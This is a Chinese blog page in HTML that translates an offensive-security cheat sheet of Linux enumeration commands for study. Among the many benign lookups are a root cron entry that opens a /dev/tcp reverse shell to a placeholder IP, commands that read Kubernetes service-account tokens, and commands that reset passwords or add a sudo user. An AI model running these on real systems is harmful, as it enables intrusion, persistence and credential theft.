@@ -1,0 +1,897 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux常用命令-横向移动-h4rithd-2024.04.03版本">
+<meta property="og:url" content="https://sh1yan.top/2024/06/02/Common-Linux-commands-horizontal-movement-h4rithd-20240403/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-06-02T14:51:47.285Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="Offensive security">
+<meta property="article:tag" content="Common Linux commands">
+<meta property="article:tag" content="horizontal movement">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Linux常用命令-横向移动-h4rithd-2024.04.03版本 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux常用命令-横向移动-h4rithd-2024.04.03版本"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-02 23:50" pubdate>
+          2024年6月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          182 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Linux常用命令-横向移动-h4rithd-2024.04.03版本</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
+<span id="more"></span>  
+
+<h2 id="01-常用枚举"><a href="#01-常用枚举" class="headerlink" title="01.常用枚举"></a>01.常用枚举</h2><p>大部分命令摘自： <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</a></p>
+<h3 id="01-1-操作系统枚举"><a href="#01-1-操作系统枚举" class="headerlink" title="01.1 操作系统枚举"></a>01.1 操作系统枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 操作系统详细信息</span></span><br>cat /etc/*-release<br>cat /proc/version<br>lsb_release -a<br>hostnamectl<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 是否已加入域？</span></span><br>cat /etc/krb5.conf<br>kinit -k host/$(hostname -f)<br>realm list | grep active-directory<br>adcli testjoin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 内核版本</span></span><br>uname -a<br>uname --kernel-name --kernel-release --machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| SUDO版本</span></span><br>sudo -V 2&gt;/dev/null | grep &quot;Sudo ver&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 系统统计信息/磁盘信息</span></span><br>(df -h || lsblk) 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有服务</span></span><br>(service --status-all || service -e || chkconfig --list || rc-status || launchctl list) 2&gt;/dev/null    <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 装载的文件</span></span><br>(mount -l || cat /proc/self/mountinfo || cat /proc/1/mountinfo || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts )2&gt;/dev/null | grep -Ev &quot;/ /|/null | proc proc |/dev/console&quot;          <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| USB创建者？</span></span><br>busctl list 2&gt;/dev/null | grep -q com.ubuntu.USBCreator<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| ASLR已启用？</span></span><br>cat /proc/sys/kernel/randomize_va_space 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 虚拟环境？</span></span><br>systemd-detect-virt<br>grep flags /proc/cpuinfo 2&gt;/dev/null | grep hypervisor<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 搜索套接字文件</span></span><br>find / -type s 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 具有功能的文件</span></span><br>getcap -r / 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 设置文件的功能</span></span><br>sudo setcap cap_net_bind_service=+ep $(readlink -f /usr/bin/python3)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| lxc容器内部？</span></span><br>cat /proc/1/environ<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| docker码头工人内部？</span></span><br>find / -maxdepth 3 -name &#x27;*dockerenv*&#x27; -exec ls -la &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 枚举Docker套接字</span></span><br>find / ! -path &quot;/sys/*&quot; -type s -name &quot;docker.sock&quot; -o -name &quot;docker.socket&quot; 2&gt;/dev/null      <br>curl -s --unix-socket &lt;socket_path&gt; http://localhost/info<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 枚举 Kubernetes</span></span> <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Kubernetes命名空间</span></span><br>cat /run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/namespace /secrets/kubernetes.io/serviceaccount/namespace 2&gt;/dev/null      <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Kubernetes token</span></span><br>cat /run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/token /secrets/kubernetes.io/serviceaccount/token 2&gt;/dev/null     <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Kubernetes服务帐户文件夹</span></span><br>ls -lR /run/secrets/kubernetes.io/ /var/run/secrets/kubernetes.io/ /secrets/kubernetes.io/ 2&gt;/dev/null     <br></code></pre></td></tr></table></figure>
+
+<h3 id="01-2-用户枚举"><a href="#01-2-用户枚举" class="headerlink" title="01.2 用户枚举"></a>01.2 用户枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出用户的组</span></span><br>(id || (whoami &amp;&amp; groups)) 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出用户的权限</span></span><br>sudo -l<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有用户</span></span><br>cat /etc/passwd | grep sh$ | awk -F: &#x27;&#123;print $1&#125;&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 超级用户</span></span><br>awk -F: &#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27; /etc/passwd 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 具有控制台的用户</span></span><br>grep &quot;sh$&quot; /etc/passwd 2&gt;/dev/null | sort <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 登录活动</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 当前登录</span></span><br>(w || who || finger || users) 2&gt;/dev/null<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 最后登录</span></span><br>(last -Faiw || last) 2&gt;/dev/null | tail<br>lastlog 2&gt;/dev/null | grep -v &quot;Never&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 密码策略</span></span><br>grep &quot;^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD&quot; /etc/login.defs 2&gt;/dev/null        <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 更改用户密码</span></span><br>echo &quot;h4rithd&quot; | passwd --stdin &lt;user&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 将新用户添加到sudo组</span></span><br>useradd -p $(openssl passwd -1 h4rithd) -m newadmin --groups sudo  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 创建具有给定id的用户组（&amp;G）</span></span><br>sudo groupadd -g 2017 dummy<br>sudo useradd dummy -u 2017 -g 2017 -s /bin/bash<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-3-进程枚举"><a href="#01-3-进程枚举" class="headerlink" title="01.3 进程枚举"></a>01.3 进程枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有当前流程</span></span><br>ps -auxw | less -w<br>(ps fauxwww || ps auxwww | sort ) 2&gt;/dev/null | grep -v &quot;\[&quot; | grep -v &quot;%CPU&quot; | grep --color=always -z root        <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出属于当前用户的所有当前进程</span></span><br>ps -ef | grep $(whoami) | less -w<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 二进制进程权限</span></span><br>ps auxwww 2&gt;/dev/null | awk &#x27;&#123;print $11&#125;&#x27; | xargs ls -la 2&gt;/dev/null |awk &#x27;!x[$0]++&#x27; 2&gt;/dev/null | grep -v &quot; root root &quot; | grep -v &quot; $USER &quot;            <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有cron作业</span></span><br>grep &quot;CRON&quot; /var/log/cron.log<br>cat /etc/crontab<br>ls -alR /etc/cron* /var/spool/cron/crontabs /var/spool/anacron 2&gt;/dev/null <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出crontab中的文件</span></span><br>ls -al /var/spool/cron/crontabs/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 创建cron任务</span></span><br>* * * * *    root    bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;Port&gt; 0&gt;&amp;1&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有系统/计时器</span></span><br>watch -n 1 &#x27;systemctl list-timers&#x27;<br>systemctl list-timers --all 2&gt;/dev/null | grep -Ev &quot;(^$|timers listed)&quot; <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 您可以通过获取服务路径</span></span><br>find /etc | grep &lt;ACTIVATES&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-4-网络枚举"><a href="#01-4-网络枚举" class="headerlink" title="01.4 网络枚举"></a>01.4 网络枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出IP地址</span></span><br>ifconfig<br>ip -c -a -h addrbash<br>cat /proc/net/fib_trie  | grep &#x27;|--&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出 ARP 表</span></span><br>arp -n<br>cat /proc/net/arp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 关闭当前端口连接</span></span><br>fuser -k 4444/tcp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有开放端口或隧道</span></span><br>netstat -anlp | grep LIST<br>(netstat -punta || ss -nltpu || netstat -anv) 2&gt;/dev/null | grep -i listen<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 在端口上获取什么服务</span></span><br>ps -ef | grep &lt;PID&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 主机名、主机和DNS</span></span><br>cat /etc/hostname /etc/hosts /etc/resolv.conf 2&gt;/dev/null | grep -v &quot;^#&quot; | grep -Ev &quot;\W+\#|^#&quot; 2&gt;/dev/null           <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 网络和邻居</span></span><br>netstat -rn 2&gt;/dev/null<br>(route || ip n || cat /proc/net/route) 2&gt;/dev/null<br>(arp -e || arp -a || cat /proc/net/arp) 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出本地网络</span></span><br>ip a | grep -Eo &#x27;inet[^6]\S+[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | grep -E &quot;^10\.|^172\.|^192\.168\.|^169\.254\.&quot;     <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 读取/proc中的网络地址</span></span><br>cat /proc/net/tcp | awk &#x27;&#123;print $1,$2,$3,$4&#125;&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 0: 00000000:0016 00000000:0000 0A</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |      |      |      |      |   |--&gt; connection state</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |      |      |      |      |------&gt; remote TCP port number</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |      |      |      |-------------&gt; remote IPv4 address</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |      |      |--------------------&gt; local TCP port number</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |      |---------------------------&gt; local IPv4 address</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## |----------------------------------&gt; number of entry</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Perl script to decode the address at /proc/net/tcp</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Usage prel proc.pl 00000000 0016</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/perl</span><br>my $hexip=$ARGV[0];<br>my $hexport=$ARGV[1];<br>print &quot;hex: $hexip\n&quot;;<br>my @ip = map hex($_), ( $hexip =~ m/../g );<br>my $ip = join(&#x27;.&#x27;,reverse(@ip));<br>my $port = hex($hexport);<br>print &quot;IP: $ip  PORT: $port\n&quot;; <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 创建pcap文件</span></span><br>sudo tcpdump -i any -w /tmp/capture.pcap -v<br>sudo tcpdump -i any -w /tmp/capture.pcap -v -s0<br>sudo tcpdump -i any -w /tmp/capture.pcap -v icmp<br>sudo tcpdump -i any -w /tmp/capture.pcap -v port 21<br>sudo tcpdump -i any -w /tmp/capture.pcap -v not port 22<br>sudo tcpdump -i any -w /tmp/capture.pcap -v -s0 -nn port 80<br></code></pre></td></tr></table></figure>
+
